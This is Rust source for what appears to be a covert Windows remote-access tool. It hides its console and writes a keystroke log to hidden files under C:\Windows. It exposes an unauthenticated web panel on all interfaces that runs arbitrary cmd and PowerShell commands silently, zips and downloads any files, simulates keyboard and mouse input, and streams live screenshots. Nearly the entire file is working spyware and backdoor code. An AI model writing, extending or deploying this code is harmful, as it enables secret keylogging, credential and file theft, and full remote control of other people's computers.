#![windows_subsystem = "windows"]
use axum::{
    Router,
    extract::ws::{Message, WebSocketUpgrade},
    response::Html,
    routing::{get, post},
    serve,
};
use axum_extra::{extract::Form, response::Attachment};
use device_query::{DeviceEvents, DeviceEventsHandler};
use enigo::{Axis, Button, Coordinate, Direction, Enigo, Keyboard, Mouse, Settings};
use rdev::{EventType, Key, listen, simulate};
use std::{
    env::args,
    fs::{File, OpenOptions, read_dir, symlink_metadata},
    io::{Cursor, Read, Seek, SeekFrom, Write, copy},
    os::windows::fs::OpenOptionsExt,
    path::Path,
    sync::{Arc, Mutex},
};
use tokio::{net::TcpListener, process::Command, spawn, time::Duration};
use webp_screenshot_rust::{CaptureConfig, WebPScreenshot};
use zip::{ZipWriter, write::FileOptions};

fn add_to_zip(
    zip: &mut ZipWriter<&mut Cursor<Vec<u8>>>,
    dir: &Path,
    base: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let metadata = symlink_metadata(dir)?;

    if metadata.is_file() {
        // 处理文件
        let file_name = dir.file_name().unwrap().to_string_lossy();
        let zip_path = if base.is_empty() {
            file_name.to_string()
        } else {
            format!("{}/{}", base, file_name)
        };
        zip.start_file::<String, ()>(zip_path, FileOptions::default())?;
        let mut src = File::open(dir)?;
        copy(&mut src, zip)?;
    } else if metadata.is_dir() {
        // 处理目录
        let dir_name = dir.file_name().unwrap().to_string_lossy();
        let zip_dir = if base.is_empty() {
            format!("{}/", dir_name)
        } else {
            format!("{}/{}/", base, dir_name)
        };
        zip.add_directory::<String, ()>(zip_dir, FileOptions::default())?;

        // 更新 base 供子项使用
        let new_base = if base.is_empty() {
            dir_name.to_string()
        } else {
            format!("{}/{}", base, dir_name)
        };

        // 递归处理所有子项
        for entry in read_dir(dir)? {
            let entry = entry?;
            let path = entry.path();
            add_to_zip(zip, &path, &new_base)?;
        }
    }
    Ok(())
}
#[tokio::main]
async fn main() {
    let mut arg = args();
    arg.next();
    let lock = Arc::new(Mutex::new(
        OpenOptions::new()
            .read(true)
            .write(true)
            .create(true)
            .attributes(2)
            .open("C:\\Windows\\opt.log")
            .unwrap(),
    ));
    let lock1 = lock.clone();
    let lock2 = lock.clone();
    let lck = Arc::new(Mutex::new(
        OpenOptions::new()
            .read(true)
            .write(true)
            .create(true)
            .attributes(2)
            .open("C:\\Windows\\full.log")
            .unwrap(),
    ));
    let lck1 = lck.clone();
    let lck2 = lck.clone();
    let lck3 = lck.clone();
    let handler = DeviceEventsHandler::new(Duration::ZERO).unwrap();
    let enigo = Arc::new(Mutex::new(Enigo::new(&Settings::default()).unwrap()));
    let _down = handler.on_key_down(move |key| {
        let mut f = lck2.lock().unwrap();
        f.seek(SeekFrom::End(0)).unwrap();
        f.write((key.to_string() + "&#x2193; ").as_bytes()).unwrap();
    });
    let _up = handler.on_key_up(move |key| {
        let mut f = lck3.lock().unwrap();
        f.seek(SeekFrom::End(0)).unwrap();
        f.write((key.to_string() + "&#x2191; ").as_bytes()).unwrap();
    });
    spawn(async move {
        loop {
            let l = lock2.clone();
            listen(move |e| {
                if let Some(name) = e.name {
                    let mut f = l.lock().unwrap();
                    f.seek(SeekFrom::End(0)).unwrap();
                    f.write(
                        match &name[..] {
                            "&" => "&amp;",
                            "<" => "&lt;",
                            others => others,
                        }
                        .as_bytes(),
                    )
                    .unwrap();
                }
            })
            .unwrap();
        }
    });
    serve(
        TcpListener::bind("0.0.0.0:".to_string() + &arg.next().unwrap_or("1145".to_string()))
            .await
            .unwrap(),
        Router::new()
            .route(
                "/",
                post(async move |Form(frm): Form<Vec<(String, String)>>| {
                    let mut buf = Cursor::new(Vec::new());
                    let mut zip = ZipWriter::new(&mut buf);
                    for (a, b) in frm {
                        match &a[..] {
                            "cmd" => {
                                Command::new("cmd")
                                    .creation_flags(0x08000000)
                                    .arg("/c")
                                    .arg(b)
                                    .spawn()
                                    .unwrap();
                            }
                            "pow" => {
                                Command::new("powershell")
                                    .creation_flags(0x08000000)
                                    .arg("-Command")
                                    .arg(b)
                                    .spawn()
                                    .unwrap();
                            }
                            "clr" => {
                                let mut f = lck.lock().unwrap();
                                let mut g = lock.lock().unwrap();
                                f.set_len(0).unwrap();
                                g.set_len(0).unwrap();
                                f.seek(SeekFrom::Start(0)).unwrap();
                                g.seek(SeekFrom::Start(0)).unwrap();
                            }
                            "txt" => enigo.lock().unwrap().text(&b).unwrap(),
                            "zip" => add_to_zip(&mut zip, b.as_ref(), "").unwrap(),
                            "mre" => {
                                let mut parts = b.split_whitespace();
                                enigo
                                    .lock()
                                    .unwrap()
                                    .move_mouse(
                                        parts.next().unwrap().parse().unwrap(),
                                        parts.next().unwrap().parse().unwrap(),
                                        Coordinate::Rel,
                                    )
                                    .unwrap()
                            }
                            "mab" => {
                                let mut parts = b.split_whitespace();
                                enigo
                                    .lock()
                                    .unwrap()
                                    .move_mouse(
                                        parts.next().unwrap().parse().unwrap(),
                                        parts.next().unwrap().parse().unwrap(),
                                        Coordinate::Abs,
                                    )
                                    .unwrap()
                            }
                            "scr" => enigo
                                .lock()
                                .unwrap()
                                .scroll(b.parse().unwrap(), Axis::Vertical)
                                .unwrap(),
                            "kdn" => match &b[..] {
                                "l" => enigo
                                    .lock()
                                    .unwrap()
                                    .button(Button::Left, Direction::Press)
                                    .unwrap(),
                                "m" => enigo
                                    .lock()
                                    .unwrap()
                                    .button(Button::Middle, Direction::Press)
                                    .unwrap(),
                                "r" => enigo
                                    .lock()
                                    .unwrap()
                                    .button(Button::Right, Direction::Press)
                                    .unwrap(),
                                k => {
                                    simulate(&EventType::KeyPress(Key::Unknown(k.parse().unwrap())))
                                        .unwrap()
                                }
                            },
                            "kup" => match &b[..] {
                                "l" => enigo
                                    .lock()
                                    .unwrap()
                                    .button(Button::Left, Direction::Release)
                                    .unwrap(),
                                "m" => enigo
                                    .lock()
                                    .unwrap()
                                    .button(Button::Middle, Direction::Release)
                                    .unwrap(),
                                "r" => enigo
                                    .lock()
                                    .unwrap()
                                    .button(Button::Right, Direction::Release)
                                    .unwrap(),
                                k => simulate(&EventType::KeyRelease(Key::Unknown(
                                    k.parse().unwrap(),
                                )))
                                .unwrap(),
                            },
                            _ => (),
                        }
                    }
                    zip.finish().unwrap();
                    Attachment::new(buf.into_inner())
                        .filename("archive.zip")
                        .content_type("application/zip")
                })
                .get(async move || {
                    let mut f = lck1.lock().unwrap();
                    let mut g = lock1.lock().unwrap();
                    f.seek(SeekFrom::Start(0)).unwrap();
                    g.seek(SeekFrom::Start(0)).unwrap();
                    let mut s = String::new();
                    let mut t = String::new();
                    f.read_to_string(&mut s).unwrap();
                    g.read_to_string(&mut t).unwrap();
                    Html(format!(r#"<!DOCTYPE html>
                    <html>
                    <head>
                        <meta charset="UTF-8">
                        <title>MTCGAGA</title>
                        <script>
                            // 更新 input 的 name 为下拉框选中的值
                            function updateName(select) {{
                                const input = select.parentElement.querySelector('input[type="text"]');
                                if (input)
                                    input.name = select.value;
                            }}
                            // 在当前项之后插入一个新项
                            function addAfter(btn) {{
                                const currentItem = btn.parentElement;          // 当前所在的 <div>
                                const form = document.querySelector('form');    // 获取表单
                                const div = document.createElement('div');
                                div.innerHTML = `
                                    <select onchange="updateName(this)">
                                        <option value="cmd">运行命令提示符命令</option>
                                        <option value="pow">运行 Powershell 命令</option>
                                        <option value="clr">清空按键记录</option>
                                        <option value="txt">键入文本</option>
                                        <option value="zip">下载文件</option>
                                        <option value="mre">鼠标相对移动</option>
                                        <option value="mab">鼠标绝对移动</option>
                                        <option value="scr">滑动鼠标滚轮</option>
                                        <option value="kdn">按下（键盘码或l、r、m表示鼠标键）</option>
                                        <option value="kup">抬起（键盘码或l、r、m表示鼠标键）</option>
                                    </select>
                                    <input type="text" name="cmd" placeholder="请输入参数……">
                                    <button type="button" onclick="addAfter(this)">添加</button>
                                    <button type="button" onclick="removeItem(this)">删除</button>
                                `;
                                form.insertBefore(div, currentItem.nextSibling);
                                // 初始化新项的 input.name
                                const newSelect = div.querySelector('select');
                                const newInput = div.querySelector('input[type="text"]');
                                if (newSelect && newInput) {{
                                    newInput.name = newSelect.value;
                                }}
                            }}
                            // 删除当前项，但至少保留一项
                            function removeItem(btn) {{
                                const item = btn.parentElement;
                                const form = document.querySelector('form');
                                const items = form.querySelectorAll('div');
                                if (items.length > 1) {{
                                    item.remove();
                                }} else {{
                                    alert('至少保留一项');
                                }}
                            }}
                            window.onload = function() {{
                                document.querySelectorAll('form div select')
                                    .forEach(select => updateName(select));
                            }};
                        </script>
                    </head>
                    <body>
                        <form action="/" method="post">
                            <!-- 初始项 -->
                            <div>
                                <select onchange="updateName(this)">
                                    <option value="cmd">运行命令提示符命令</option>
                                    <option value="pow">运行 Powershell 命令</option>
                                    <option value="clr">清空按键记录</option>
                                    <option value="txt">键入文本</option>
                                    <option value="zip">下载文件</option>
                                    <option value="mre">鼠标相对移动</option>
                                    <option value="mab">鼠标绝对移动</option>
                                    <option value="scr">滑动鼠标滚轮</option>
                                    <option value="kdn">按下（键盘码或l、r、m表示鼠标键）</option>
                                    <option value="kup">抬起（键盘码或l、r、m表示鼠标键）</option>
                                </select>
                                <input type="text" name="cmd" placeholder="请输入参数……">
                                <button type="button" onclick="addAfter(this)">添加</button>
                                <button type="button" onclick="removeItem(this)">删除</button>
                            </div>
                            <button type="submit">提交</button>
                        </form>
                        <pre style="white-space:pre-wrap">{}<hr>{}</pre>
                        <img src='screen.webp'>
                        <script>
                            const ws = new WebSocket('screen.webp');
                            const img = document.querySelector('img');
                            ws.onmessage = (e) => {{
                                if (e.data instanceof Blob)
                                    img.src = URL.createObjectURL(event.data)
                            }}
                        </script>
                    </body>
                    </html>"#, s, t))
                }),
            )
            .route(
                "/screen.webp",
                get(async |ws: WebSocketUpgrade| {
                    ws.on_upgrade(async |mut sk| {
                        loop {
                            sk.send(Message::from(
                                WebPScreenshot::with_config(CaptureConfig {
                                    include_cursor: true,
                                    ..Default::default()
                                })
                                .unwrap()
                                .capture_display(0)
                                .unwrap()
                                .data,
                            ))
                            .await
                            .unwrap();
                        }
                    })
                }),
            ),
    )
    .await
    .unwrap();
}
